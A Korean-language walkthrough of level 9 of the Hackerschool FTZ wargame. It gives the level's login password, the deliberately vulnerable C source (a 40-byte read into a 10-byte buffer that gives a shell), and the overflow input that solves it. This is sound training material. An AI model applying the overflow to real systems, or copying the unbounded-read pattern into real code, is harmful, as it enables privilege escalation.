---
sort: 9
---

# Level 9

```note
id : level9

password : apple
```

힌트를 보면 /usr/bin/bof의 소스코드를 준다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
main(){
 
  char buf2[10];
  char buf[10];
 
  printf("It can be overflow : ");
  fgets(buf,40,stdin);
 
  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }
 
}
```

bof는 buffer overflow의 약자로 말 그대로 buffer가 넘쳐버리는 취약점이다.<br>
buf의 크기는 10byte인데 fgets를 통해서 입력받는 길이는 40byte기 때문에 30byte가 넘쳐버린다.<br>
이는 메모리에 있는 다른 값을 변조시키게 되기 때문에 프로그램이 망가지게된다.<br><br>
stack은 대충 아래처럼 생겼을 것인데 정확하게 하려면 buf와 buf2사이의 간격을 알아내야겠지만 어차피 strncmp에서 두글자만 비교하기 때문에 대충했다.

<img src="/picture/hacker_school/ftz/level9.png" width="300"/>

```bash
[level9@ftz level9]$ bof
It can be overflow : gogogogogogogogogogogogogogo
Good Skill!
```

```tip
## 알게 된 점

buffer overflow
```